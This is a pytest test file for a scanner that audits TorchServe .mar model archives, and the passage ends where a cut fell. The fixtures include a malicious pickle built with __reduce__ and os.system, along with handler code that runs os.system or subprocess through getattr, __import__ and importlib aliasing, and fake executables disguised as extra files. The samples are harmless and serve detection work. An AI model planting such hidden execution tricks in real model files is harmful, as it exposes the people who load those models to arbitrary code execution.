"""Tests for TorchServe .mar scanner."""

from __future__ import annotations

import ast
import json
import pickle
import stat
import tempfile
import zipfile
from collections.abc import Mapping, Sequence
from pathlib import Path
from typing import Any, cast

import pytest

from modelaudit import core
from modelaudit.cache import get_cache_manager, reset_cache_manager
from modelaudit.cache.optimized_config import build_cache_version_context
from modelaudit.scanner_selection import normalize_scanner_selection_config
from modelaudit.scanners.base import CheckStatus, IssueSeverity, ScanResult
from modelaudit.scanners.torchserve_mar_scanner import TorchServeMarScanner
from modelaudit.scanners.zip_scanner import ZipScanner
from tests.helpers import create_mock_pytorch_zip


def _create_mar_archive(
    tmp_path: Path,
    manifest: dict[str, Any] | str | None,
    entries: Mapping[str, bytes] | Sequence[tuple[str, bytes]],
    filename: str = "model.mar",
    compression: int = zipfile.ZIP_STORED,
) -> Path:
    mar_path = tmp_path / filename
    with zipfile.ZipFile(mar_path, "w", compression=compression) as archive:
        if manifest is not None:
            manifest_bytes = (
                manifest.encode("utf-8")
                if isinstance(manifest, str)
                else json.dumps(manifest).encode(
                    "utf-8",
                )
            )
            archive.writestr("MAR-INF/MANIFEST.json", manifest_bytes)

        archive_entries = entries.items() if isinstance(entries, Mapping) else entries
        for name, data in archive_entries:
            archive.writestr(name, data)

    return mar_path


def _build_malicious_pickle() -> bytes:
    import os as os_module

    # This helper intentionally builds a malicious pickle for scanner coverage.
    # The payload command is a harmless `echo` so test fixtures stay safe.
    class DangerousPayload:
        def __reduce__(self):
            return (os_module.system, ("echo torchserve-mar-test",))

    return pickle.dumps(DangerousPayload())


def _failed_checks(result: ScanResult, check_name: str) -> list[Any]:
    return [check for check in result.checks if check.name == check_name and check.status == CheckStatus.FAILED]


def _checks_named(result: ScanResult, check_name: str) -> list[Any]:
    return [check for check in result.checks if check.name == check_name]


def _assert_inconclusive_aggregate_not_cached(
    path: Path,
    expected_reason: str,
    cache_dir: Path,
    **scan_kwargs: Any,
) -> None:
    reset_cache_manager()
    try:
        first = core.scan_model_directory_or_file(
            str(path),
            cache_enabled=True,
            cache_dir=str(cache_dir),
            min_cache_file_size=0,
            **scan_kwargs,
        )
        second = core.scan_model_directory_or_file(
            str(path),
            cache_enabled=True,
            cache_dir=str(cache_dir),
            min_cache_file_size=0,
            **scan_kwargs,
        )

        for aggregate in (first, second):
            metadata = aggregate.file_metadata[str(path)]
            assert metadata["scan_outcome"] == "inconclusive"
            assert expected_reason in metadata["scan_outcome_reasons"]
            assert not [
                issue for issue in aggregate.issues if issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
            ]
            assert core.determine_exit_code(aggregate) == 2

        top_level_config = normalize_scanner_selection_config(
            {
                "blacklist_patterns": None,
                "max_file_size": 0,
                "max_total_size": 0,
                "timeout": 3600,
                "skip_file_types": True,
                "strict_license": False,
                "cache_enabled": True,
                "cache_dir": str(cache_dir),
                "min_cache_file_size": 0,
                **scan_kwargs,
            }
        )
        cached_parent = get_cache_manager(str(cache_dir), enabled=True).get_cached_result(
            str(path),
            version_context=build_cache_version_context(top_level_config),
        )
        assert cached_parent is None
    finally:
        reset_cache_manager()


def test_can_handle_valid_mar_archive(tmp_path: Path) -> None:
    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries={
            "handler.py": b"def handle(data, context):\n    return data\n",
            "weights.bin": b"weights",
        },
    )

    assert TorchServeMarScanner.can_handle(str(mar_path))


def test_can_handle_rejects_non_zip_and_missing_manifest(tmp_path: Path) -> None:
    non_zip_mar = tmp_path / "not_zip.mar"
    non_zip_mar.write_bytes(b"not a zip archive")
    assert not TorchServeMarScanner.can_handle(str(non_zip_mar))

    missing_manifest_mar = _create_mar_archive(tmp_path, manifest=None, entries={"weights.bin": b"weights"})
    assert not TorchServeMarScanner.can_handle(str(missing_manifest_mar))


def test_can_handle_rejects_invalid_manifest_json(tmp_path: Path) -> None:
    invalid_manifest_mar = _create_mar_archive(
        tmp_path,
        manifest='{"model": {"handler": "handler.py", "serializedFile": "weights.bin"',
        entries={"handler.py": b"def handle(data, context):\n    return data\n", "weights.bin": b"weights"},
    )

    assert not TorchServeMarScanner.can_handle(str(invalid_manifest_mar))


def test_depth_limit_returns_inconclusive_exit_code_without_security_finding(tmp_path: Path) -> None:
    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries={
            "handler.py": b"def handle(data, context):\n    return data\n",
            "weights.bin": b"weights",
        },
        filename="bounded_depth.mar",
    )

    direct = TorchServeMarScanner(config={"_mar_depth": 1, "max_mar_depth": 1}).scan(str(mar_path))
    _assert_inconclusive_aggregate_not_cached(
        mar_path,
        "torchserve_mar_depth_limit",
        tmp_path / "depth-limit-cache",
        _mar_depth=1,
        max_mar_depth=1,
    )

    depth_checks = _failed_checks(direct, "TorchServe MAR Depth Limit")
    assert len(depth_checks) == 1
    assert depth_checks[0].severity == IssueSeverity.INFO
    assert direct.metadata["scan_outcome"] == "inconclusive"
    assert "torchserve_mar_depth_limit" in direct.metadata["scan_outcome_reasons"]


def test_scan_benign_mar_with_safe_handler(tmp_path: Path) -> None:
    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin", "extraFiles": "labels.json"}}
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries={
            "handler.py": b"def handle(data, context):\n    return {'ok': True}\n",
            "weights.bin": b"weights",
            "labels.json": b'{"0": "cat"}',
        },
    )

    result = TorchServeMarScanner().scan(str(mar_path))
    handler_failures = _failed_checks(result, "TorchServe Handler Static Analysis")
    assert len(handler_failures) == 0


@pytest.mark.parametrize(
    ("payload", "expected_rule_code"),
    [
        (b"\x7fELF" + b"\x00" * 64, "S502"),
        (b"MZ" + b"\x00" * 58 + (64).to_bytes(4, "little") + b"PE\x00\x00" + b"\x00" * 16, "S501"),
    ],
)
def test_scan_flags_content_disguised_executable_extra_file(
    tmp_path: Path, payload: bytes, expected_rule_code: str
) -> None:
    manifest = {
        "model": {
            "handler": "handler.py",
            "serializedFile": "weights.bin",
            "extraFiles": "native/payload.dat",
        },
    }
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries={
            "handler.py": b"def handle(data, context):\n    return data\n",
            "weights.bin": b"weights",
            "native/payload.dat": payload,
        },
        filename="disguised_executable_extra_file.mar",
    )

    result = TorchServeMarScanner().scan(str(mar_path))
    aggregate = core.scan_model_directory_or_file(str(mar_path), cache_enabled=False)

    executable_checks = _failed_checks(result, "TorchServe Executable Extra File Detection")
    assert len(executable_checks) == 1
    assert executable_checks[0].rule_code == expected_rule_code
    assert executable_checks[0].details["entry"] == "native/payload.dat"
    assert core.determine_exit_code(aggregate) == 1


def test_scan_flags_name_disguised_executable_extra_file(tmp_path: Path) -> None:
    manifest = {
        "model": {
            "handler": "handler.py",
            "serializedFile": "weights.bin",
            "extraFiles": "native/payload.so",
        },
    }
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries={
            "handler.py": b"def handle(data, context):\n    return data\n",
            "weights.bin": b"weights",
            "native/payload.so": b"compiled sidecar metadata\n",
        },
        filename="name_disguised_executable_extra_file.mar",
    )

    result = TorchServeMarScanner().scan(str(mar_path))
    aggregate = core.scan_model_directory_or_file(str(mar_path), cache_enabled=False)

    executable_checks = _failed_checks(result, "TorchServe Executable Extra File Detection")
    assert len(executable_checks) == 1
    assert executable_checks[0].rule_code == "S502"
    assert executable_checks[0].details["entry"] == "native/payload.so"
    assert core.determine_exit_code(aggregate) == 1


def test_scan_prefers_extracted_extra_file_content_over_executable_name(tmp_path: Path) -> None:
    manifest = {
        "model": {
            "handler": "handler.py",
            "serializedFile": "weights.bin",
            "extraFiles": "native/payload.exe",
        },
    }
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries={
            "handler.py": b"def handle(data, context):\n    return data\n",
            "weights.bin": b"weights",
            "native/payload.exe": b"\x7fELF" + b"\x00" * 64,
        },
        filename="content_first_executable_extra_file.mar",
    )

    result = TorchServeMarScanner().scan(str(mar_path))

    executable_checks = _failed_checks(result, "TorchServe Executable Extra File Detection")
    assert len(executable_checks) == 1
    assert executable_checks[0].rule_code == "S502"
    assert executable_checks[0].details["entry"] == "native/payload.exe"


def test_scan_flags_oversized_named_executable_extra_file(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    manifest = {
        "model": {
            "handler": "handler.py",
            "serializedFile": "weights.bin",
            "extraFiles": "native/payload.so",
        },
    }
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries={
            "handler.py": b"def handle(data, context):\n    return data\n",
            "weights.bin": b"weights",
            "native/payload.so": b"x" * 257,
        },
        filename="oversized_named_executable_extra_file.mar",
    )
    extracted_temp_paths: list[Path] = []
    real_named_temporary_file = tempfile.NamedTemporaryFile

    def named_temporary_file_in_tmp_path(*args: Any, **kwargs: Any) -> Any:
        kwargs["dir"] = tmp_path
        temporary_file = real_named_temporary_file(*args, **kwargs)
        extracted_temp_paths.append(Path(temporary_file.name))
        return temporary_file

    monkeypatch.setattr(tempfile, "NamedTemporaryFile", named_temporary_file_in_tmp_path)

    result = TorchServeMarScanner(config={"max_mar_member_bytes": 256}).scan(str(mar_path))
    aggregate = core.scan_model_directory_or_file(
        str(mar_path),
        cache_enabled=False,
        max_mar_member_bytes=256,
    )

    executable_checks = _failed_checks(result, "TorchServe Executable Extra File Detection")
    member_limit_checks = _failed_checks(result, "TorchServe MAR Member Size Limit")
    assert len(executable_checks) == 1
    assert executable_checks[0].rule_code == "S502"
    assert executable_checks[0].details["entry"] == "native/payload.so"
    assert any(check.details["entry"] == "native/payload.so" for check in member_limit_checks)
    assert "torchserve_mar_member_size_limit" in result.metadata["scan_outcome_reasons"]
    assert core.determine_exit_code(aggregate) == 1
    assert extracted_temp_paths
    assert all(not path.exists() for path in extracted_temp_paths)


def test_scan_flags_named_executable_extra_file_when_byte_budget_prevents_extraction(tmp_path: Path) -> None:
    manifest = {
        "model": {
            "handler": "handler.py",
            "serializedFile": "weights.bin",
            "extraFiles": "native/payload.so",
        },
    }
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries=[
            ("native/payload.so", b"compiled sidecar metadata\n"),
            ("handler.py", b"def handle(data, context):\n    return data\n"),
            ("weights.bin", b"weights"),
        ],
        filename="budgeted_named_executable_extra_file.mar",
    )
    with zipfile.ZipFile(mar_path) as archive:
        manifest_size = archive.getinfo("MAR-INF/MANIFEST.json").file_size

    result = TorchServeMarScanner(config={"max_mar_uncompressed_bytes": manifest_size}).scan(str(mar_path))
    aggregate = core.scan_model_directory_or_file(
        str(mar_path),
        cache_enabled=False,
        max_mar_uncompressed_bytes=manifest_size,
    )

    executable_checks = _failed_checks(result, "TorchServe Executable Extra File Detection")
    budget_checks = _failed_checks(result, "TorchServe MAR Uncompressed Size Budget")
    assert len(executable_checks) == 1
    assert executable_checks[0].rule_code == "S502"
    assert len(budget_checks) == 1
    assert "torchserve_mar_uncompressed_budget" in result.metadata["scan_outcome_reasons"]
    assert core.determine_exit_code(aggregate) == 1


def test_scan_flags_named_executable_extra_file_after_byte_budget_stop(tmp_path: Path) -> None:
    manifest = {
        "model": {
            "handler": "handler.py",
            "serializedFile": "weights.bin",
            "extraFiles": "native/payload.so",
        },
    }
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries=[
            ("handler.py", b"def handle(data, context):\n    return data\n"),
            ("weights.bin", b"weights"),
            ("native/payload.so", b"compiled sidecar metadata\n"),
        ],
        filename="late_budgeted_named_executable_extra_file.mar",
    )
    with zipfile.ZipFile(mar_path) as archive:
        manifest_size = archive.getinfo("MAR-INF/MANIFEST.json").file_size

    result = TorchServeMarScanner(config={"max_mar_uncompressed_bytes": manifest_size}).scan(str(mar_path))
    aggregate = core.scan_model_directory_or_file(
        str(mar_path),
        cache_enabled=False,
        max_mar_uncompressed_bytes=manifest_size,
    )

    executable_checks = _failed_checks(result, "TorchServe Executable Extra File Detection")
    budget_checks = _failed_checks(result, "TorchServe MAR Uncompressed Size Budget")
    assert len(executable_checks) == 1
    assert executable_checks[0].rule_code == "S502"
    assert executable_checks[0].details["entry"] == "native/payload.so"
    assert len(budget_checks) == 1
    assert "torchserve_mar_uncompressed_budget" in result.metadata["scan_outcome_reasons"]
    assert core.determine_exit_code(aggregate) == 1


def test_scan_flags_named_executable_extra_file_after_entry_limit(tmp_path: Path) -> None:
    manifest = {
        "model": {
            "handler": "handler.py",
            "serializedFile": "weights.bin",
            "extraFiles": "native/payload.so",
        },
    }
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries=[
            ("handler.py", b"def handle(data, context):\n    return data\n"),
            ("weights.bin", b"weights"),
            ("native/payload.so", b"compiled sidecar metadata\n"),
        ],
        filename="limited_named_executable_extra_file.mar",
    )

    result = TorchServeMarScanner(config={"max_mar_entries": 3}).scan(str(mar_path))
    aggregate = core.scan_model_directory_or_file(
        str(mar_path),
        cache_enabled=False,
        max_mar_entries=3,
    )

    executable_checks = _failed_checks(result, "TorchServe Executable Extra File Detection")
    entry_limit_checks = _failed_checks(result, "TorchServe MAR Entry Limit")
    assert len(executable_checks) == 1
    assert executable_checks[0].rule_code == "S502"
    assert executable_checks[0].details["entry"] == "native/payload.so"
    assert len(entry_limit_checks) == 1
    assert "torchserve_mar_entry_limit" in result.metadata["scan_outcome_reasons"]
    assert core.determine_exit_code(aggregate) == 1


def test_scan_preserves_executable_extra_file_finding_when_a_later_entry_is_skipped(tmp_path: Path) -> None:
    manifest = {
        "model": {
            "handler": "handler.py",
            "serializedFile": "weights.bin",
            "extraFiles": "native/payload.dat",
        },
    }
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries=[
            ("native/payload.dat", b"\x7fELF" + b"\x00" * 64),
            ("handler.py", b"def handle(data, context):\n    return data\n"),
            ("weights.bin", b"weights"),
            ("late.txt", b"ordinary skipped content"),
        ],
        filename="detected_executable_before_entry_limit.mar",
    )

    result = TorchServeMarScanner(config={"max_mar_entries": 3}).scan(str(mar_path))
    aggregate = core.scan_model_directory_or_file(
        str(mar_path),
        cache_enabled=False,
        max_mar_entries=3,
    )

    executable_checks = _failed_checks(result, "TorchServe Executable Extra File Detection")
    entry_limit_checks = _failed_checks(result, "TorchServe MAR Entry Limit")
    assert len(executable_checks) == 1
    assert executable_checks[0].rule_code == "S502"
    assert len(entry_limit_checks) == 1
    assert entry_limit_checks[0].severity == IssueSeverity.INFO
    assert "torchserve_mar_entry_limit" in result.metadata["scan_outcome_reasons"]
    assert core.determine_exit_code(aggregate) == 1


def test_scan_allows_benign_ordinary_named_extra_file(tmp_path: Path) -> None:
    manifest = {
        "model": {
            "handler": "handler.py",
            "serializedFile": "weights.bin",
            "extraFiles": "native/payload.dat",
        },
    }
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries={
            "handler.py": b"def handle(data, context):\n    return data\n",
            "weights.bin": b"weights",
            "native/payload.dat": b"compiled feature metadata\n",
        },
        filename="benign_extra_file.mar",
    )

    result = TorchServeMarScanner().scan(str(mar_path))
    aggregate = core.scan_model_directory_or_file(str(mar_path), cache_enabled=False)

    assert _failed_checks(result, "TorchServe Executable Extra File Detection") == []
    assert core.determine_exit_code(aggregate) == 0


def test_scan_does_not_classify_serialized_weight_signature_as_extra_file(tmp_path: Path) -> None:
    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.dat"}}
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries={
            "handler.py": b"def handle(data, context):\n    return data\n",
            "weights.dat": b"\x7fELF" + b"\x00" * 64,
        },
        filename="serialized_weight_signature.mar",
    )

    result = TorchServeMarScanner().scan(str(mar_path))

    assert _failed_checks(result, "TorchServe Executable Extra File Detection") == []


def test_scan_flags_duplicate_handler_member_even_when_benign_copy_is_last(tmp_path: Path) -> None:
    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries=[
            ("handler.py", b"import os\n\ndef handle(data, context):\n    return os.system('echo owned')\n"),
            ("handler.py", b"def handle(data, context):\n    return {'ok': True}\n"),
            ("weights.bin", b"weights"),
        ],
        filename="duplicate_handler_override.mar",
    )

    result = TorchServeMarScanner().scan(str(mar_path))
    handler_failures = _failed_checks(result, "TorchServe Handler Static Analysis")

    assert len(handler_failures) == 1
    assert "os.system" in handler_failures[0].message
    assert handler_failures[0].details["handler"] == "handler.py"


def test_scan_analyzes_readable_duplicate_handler_when_later_duplicate_is_unreadable(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries=[
            ("handler.py", b"import os\n\ndef handle(data, context):\n    return os.system('echo owned')\n"),
            ("handler.py", b"def handle(data, context):\n    return {'ok': True}\n"),
            ("weights.bin", b"weights"),
        ],
        filename="unreadable_duplicate_handler.mar",
    )

    scanner = TorchServeMarScanner()
    real_read_member_bounded = scanner._read_member_bounded
    handler_read_count = 0

    def flaky_read_member_bounded(
        archive: zipfile.ZipFile,
        member_info: zipfile.ZipInfo,
        max_bytes: int,
    ) -> bytes:
        nonlocal handler_read_count
        if member_info.filename == "handler.py":
            handler_read_count += 1
            if handler_read_count == 2:
                raise OSError("handler CRC mismatch")
        return real_read_member_bounded(archive, member_info, max_bytes)

    monkeypatch.setattr(scanner, "_read_member_bounded", flaky_read_member_bounded)

    result = scanner.scan(str(mar_path))

    handler_failures = _failed_checks(result, "TorchServe Handler Static Analysis")
    assert result.success is False
    assert any(
        failure.severity == IssueSeverity.CRITICAL and "os.system" in failure.message for failure in handler_failures
    )
    assert any(
        failure.severity == IssueSeverity.INFO
        and "Unable to read handler source for static analysis: handler CRC mismatch" in failure.message
        and failure.details.get("analysis_kind") == "read"
        for failure in handler_failures
    )
    assert "torchserve_handler_read_failed" in result.metadata["scan_outcome_reasons"]


def test_unreadable_handler_returns_inconclusive_exit_code_and_is_not_cached(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries={
            "handler.py": b"def handle(data, context):\n    return data\n",
            "weights.bin": b"weights",
        },
        filename="unreadable_handler.mar",
    )
    original_read_member_bounded = TorchServeMarScanner._read_member_bounded

    def read_with_failure(
        self: TorchServeMarScanner,
        archive: zipfile.ZipFile,
        member_info: zipfile.ZipInfo,
        max_bytes: int,
    ) -> bytes:
        if member_info.filename == "handler.py":
            raise RuntimeError("CRC mismatch")
        return original_read_member_bounded(self, archive, member_info, max_bytes)

    monkeypatch.setattr(TorchServeMarScanner, "_read_member_bounded", read_with_failure)

    direct = TorchServeMarScanner().scan(str(mar_path))
    handler_failures = _failed_checks(direct, "TorchServe Handler Static Analysis")
    assert len(handler_failures) == 1
    assert handler_failures[0].severity == IssueSeverity.INFO
    assert "torchserve_handler_read_failed" in direct.metadata["scan_outcome_reasons"]
    _assert_inconclusive_aggregate_not_cached(
        mar_path,
        "torchserve_handler_read_failed",
        tmp_path / "handler-read-cache",
    )


def test_unparseable_handler_returns_inconclusive_exit_code_and_is_not_cached(tmp_path: Path) -> None:
    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries={
            "handler.py": b"def handle(data, context):\n    return (\n",
            "weights.bin": b"weights",
        },
        filename="unparseable_handler.mar",
    )

    direct = TorchServeMarScanner().scan(str(mar_path))
    handler_failures = _failed_checks(direct, "TorchServe Handler Static Analysis")
    assert len(handler_failures) == 1
    assert handler_failures[0].severity == IssueSeverity.INFO
    assert "torchserve_handler_parse_failed" in direct.metadata["scan_outcome_reasons"]
    _assert_inconclusive_aggregate_not_cached(
        mar_path,
        "torchserve_handler_parse_failed",
        tmp_path / "handler-parse-cache",
    )


def test_scan_detects_getattr_wrapped_handler_execution_primitive(tmp_path: Path) -> None:
    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries={
            "handler.py": b"import os\n\ndef handle(data, context):\n    return getattr(os, 'system')('id')\n",
            "weights.bin": b"weights",
        },
        filename="getattr_handler.mar",
    )

    result = TorchServeMarScanner().scan(str(mar_path))
    handler_failures = _failed_checks(result, "TorchServe Handler Static Analysis")

    assert len(handler_failures) == 1
    assert handler_failures[0].severity == IssueSeverity.CRITICAL
    assert "os.system" in handler_failures[0].message


@pytest.mark.parametrize(
    "handler_source",
    [
        b"import builtins\nimport os\n\ndef handle(data, context):\n    return builtins.getattr(os, 'system')('id')\n",
        (
            b"from builtins import getattr as resolve\n"
            b"import os\n\n"
            b"def handle(data, context):\n"
            b"    return resolve(os, 'system')('id')\n"
        ),
    ],
)
def test_scan_detects_aliased_getattr_wrapped_handler_execution_primitive(
    tmp_path: Path,
    handler_source: bytes,
) -> None:
    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries={
            "handler.py": handler_source,
            "weights.bin": b"weights",
        },
        filename="keyword_getattr_handler.mar",
    )

    result = TorchServeMarScanner().scan(str(mar_path))
    handler_failures = _failed_checks(result, "TorchServe Handler Static Analysis")

    assert len(handler_failures) == 1
    assert handler_failures[0].severity == IssueSeverity.CRITICAL
    assert "os.system" in handler_failures[0].message


@pytest.mark.parametrize(
    ("handler_source", "dangerous_name"),
    [
        (
            b"def handle(data, context):\n    module = __import__('os')\n    return getattr(module, 'system')('id')\n",
            "os.system",
        ),
        (
            b"from importlib import import_module as load\n"
            b"\n"
            b"def handle(data, context):\n"
            b"    runner = getattr(load('os'), 'system')\n"
            b"    return runner('id')\n",
            "os.system",
        ),
        (
            b"def handle(data, context):\n    return __import__('sub' + 'process').Popen(['id'])\n",
            "subprocess.Popen",
        ),
    ],
)
def test_scan_detects_dynamic_import_getattr_handler_execution_primitive(
    tmp_path: Path,
    handler_source: bytes,
    dangerous_name: str,
) -> None:
    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries={"handler.py": handler_source, "weights.bin": b"weights"},
        filename="dynamic_import_getattr_handler.mar",
    )

    result = TorchServeMarScanner().scan(str(mar_path))
    handler_failures = _failed_checks(result, "TorchServe Handler Static Analysis")

    assert len(handler_failures) == 1
    assert handler_failures[0].severity == IssueSeverity.CRITICAL
    assert dangerous_name in handler_failures[0].message
    assert dangerous_name in handler_failures[0].details["risky_calls"]


def test_dynamic_import_getattr_handler_analysis_ignores_safe_attributes() -> None:
    handler_source = (
        b"def handle(data, context):\n"
        b"    module = __import__('math')\n"
        b"    sqrt = getattr(module, 'sqrt')\n"
        b"    return sqrt(4)\n"
    )

    risky_calls, parse_error = TorchServeMarScanner()._find_high_risk_calls(handler_source)

    assert parse_error is None
    assert "math.sqrt" not in risky_calls
    assert risky_calls == {"__import__"}


@pytest.mark.parametrize(
    ("handler_source", "dangerous_name"),
    [
        (
            b"def handle(data, context):\n"
            b"    module = __import__('asyncio.subprocess')\n"
            b"    return module.subprocess.create_subprocess_shell('id')\n",
            "asyncio.subprocess.create_subprocess_shell",
        ),
        (
            b"def handle(data, context):\n    return __import__('ctypes').cdll.LoadLibrary('payload.so')\n",
            "ctypes.cdll.LoadLibrary",
        ),
        (
            b"def handle(data, context):\n    return __import__('ctypes').cdll['payload']()\n",
            "ctypes.cdll.__getitem__",
        ),
        (
            b"def handle(data, context):\n    return __import__('webbrowser').get().open('https://example.com')\n",
            "webbrowser.open",
        ),
        (
            b"def handle(data, context):\n"
            b"    browser = __import__('webbrowser').get()\n"
            b"    return browser.open('https://example.com')\n",
            "webbrowser.open",
        ),
    ],
)
def test_dynamic_import_handler_analysis_resolves_nested_attributes(
    handler_source: bytes,
    dangerous_name: str,
) -> None:
    risky_calls, parse_error = TorchServeMarScanner()._find_high_risk_calls(handler_source)

    assert parse_error is None
    assert dangerous_name in risky_calls


@pytest.mark.parametrize(
    "handler_source",
    [
        (b"from importlib import import_module as load\n\ndef helper(load):\n    return load('os').system('id')\n"),
        (
            b"from importlib import import_module as load\n"
            b"\n"
            b"def helper():\n"
            b"    load = len\n"
            b"    return load('os').system('id')\n"
        ),
        (b"def helper(__import__):\n    return __import__('os').system('id')\n"),
    ],
)
def test_dynamic_import_handler_analysis_respects_shadowed_import_helpers(handler_source: bytes) -> None:
    risky_calls, parse_error = TorchServeMarScanner()._find_high_risk_calls(handler_source)

    assert parse_error is None
    assert "os.system" not in risky_calls


def test_dynamic_import_handler_analysis_restores_local_import_helper() -> None:
    handler_source = (
        b"def helper(load):\n    from importlib import import_module as load\n    return load('os').system('id')\n"
    )

    risky_calls, parse_error = TorchServeMarScanner()._find_high_risk_calls(handler_source)

    assert parse_error is None
    assert "os.system" in risky_calls


def test_dynamic_import_handler_analysis_keeps_possible_branch_aliases() -> None:
    handler_source = (
        b"def handle(data, context):\n"
        b"    if context:\n"
        b"        module = __import__('os')\n"
        b"    else:\n"
        b"        module = __import__('math')\n"
        b"    return module.system('id')\n"
    )

    risky_calls, parse_error = TorchServeMarScanner()._find_high_risk_calls(handler_source)

    assert parse_error is None
    assert "os.system" in risky_calls


def test_dynamic_import_handler_analysis_keeps_possible_branch_loader_aliases() -> None:
    handler_source = (
        b"def handle(data, context):\n"
        b"    if context:\n"
        b"        from importlib import import_module as load\n"
        b"    else:\n"
        b"        from math import sqrt as load\n"
        b"    return load('os').system('id')\n"
    )

    risky_calls, parse_error = TorchServeMarScanner()._find_high_risk_calls(handler_source)

    assert parse_error is None
    assert "os.system" in risky_calls


@pytest.mark.parametrize(
    "handler_source",
    [
        (b"def handle(data, context):\n    return module.system('id')\n\nmodule = __import__('os')\n"),
        (
            b"def handle(data, context):\n"
            b"    return load('os').system('id')\n"
            b"\n"
            b"from importlib import import_module as load\n"
        ),
    ],
)
def test_dynamic_import_handler_analysis_resolves_late_global_aliases(handler_source: bytes) -> None:
    risky_calls, parse_error = TorchServeMarScanner()._find_high_risk_calls(handler_source)

    assert parse_error is None
    assert "os.system" in risky_calls


def test_dynamic_import_handler_analysis_does_not_leak_nested_import_aliases() -> None:
    handler_source = (
        b"def helper():\n"
        b"    from importlib import import_module as load\n"
        b"    return load('math').sqrt(4)\n"
        b"\n"
        b"def handle(data, context):\n"
        b"    return load('os').system('id')\n"
    )

    risky_calls, parse_error = TorchServeMarScanner()._find_high_risk_calls(handler_source)

    assert parse_error is None
    assert "os.system" not in risky_calls


@pytest.mark.parametrize(
    "handler_source",
    [
        (
            b"def handle(data, context):\n"
            b"    for module in [__import__('os')]:\n"
            b"        return getattr(module, 'system')('id')\n"
        ),
        (
            b"from contextlib import nullcontext\n"
            b"\n"
            b"def handle(data, context):\n"
            b"    with nullcontext(__import__('os')) as module:\n"
            b"        return getattr(module, 'system')('id')\n"
        ),
        (
            b"from contextlib import nullcontext\n"
            b"\n"
            b"def handle(data, context):\n"
            b"    with nullcontext(enter_result=__import__('os')) as module:\n"
            b"        return getattr(module, 'system')('id')\n"
        ),
    ],
)
def test_dynamic_import_handler_analysis_tracks_bound_aliases(handler_source: bytes) -> None:
    risky_calls, parse_error = TorchServeMarScanner()._find_high_risk_calls(handler_source)

    assert parse_error is None
    assert "os.system" in risky_calls


@pytest.mark.parametrize(
    ("handler_source", "dangerous_name"),
    [
        (
            b"def handle(data, context):\n"
            b"    return __import__('asyncio.subprocess', fromlist=['x']).create_subprocess_shell('id')\n",
            "asyncio.subprocess.create_subprocess_shell",
        ),
        (
            b"def handle(data, context):\n"
            b"    try:\n"
            b"        module = __import__('os')\n"
            b"    except Exception:\n"
            b"        module = __import__('math')\n"
            b"    return module.system('id')\n",
            "os.system",
        ),
        (
            b"def handle(data, context):\n    return getattr(__import__('os'), 'system').__call__('id')\n",
            "os.system",
        ),
        (
            b"from importlib import *\n\ndef handle(data, context):\n    return import_module('os').system('id')\n",
            "os.system",
        ),
        (
            b"def handle(data, context):\n"
            b"    ctypes_module = __import__('ctypes')\n"
            b"    loader = ctypes_module.LibraryLoader(ctypes_module.CDLL)\n"
            b"    return loader.LoadLibrary('payload.so')\n",
            "ctypes.LibraryLoader.<dynamic>",
        ),
        (
            b"from typing import TYPE_CHECKING\n"
            b"\n"
            b"def handle(data, context):\n"
            b"    return module.system('id')\n"
            b"\n"
            b"if TYPE_CHECKING:\n"
            b"    module = __import__('math')\n"
            b"else:\n"
            b"    module = __import__('os')\n",
            "os.system",
        ),
    ],
)
def test_dynamic_import_handler_analysis_closes_dynamic_execution_bypasses(
    handler_source: bytes,
    dangerous_name: str,
) -> None:
    risky_calls, parse_error = TorchServeMarScanner()._find_high_risk_calls(handler_source)

    assert parse_error is None
    assert dangerous_name in risky_calls


@pytest.mark.parametrize(
    "handler_source",
    [
        (
            b"from importlib import import_module as load\n"
            b"\n"
            b"def handle(data, context):\n"
            b"    load: object\n"
            b"    return load('os').system('id')\n"
        ),
        (
            b"from importlib import import_module as load\n"
            b"\n"
            b"def handle(data, context):\n"
            b"    if context:\n"
            b"        load = len\n"
            b"    return load('os').system('id')\n"
        ),
        (
            b"def handle(data, context):\n"
            b"    return module.system('id')\n"
            b"\n"
            b"if __name__ == '__main__':\n"
            b"    module = __import__('os')\n"
        ),
        (
            b"from typing import TYPE_CHECKING\n"
            b"\n"
            b"def handle(data, context):\n"
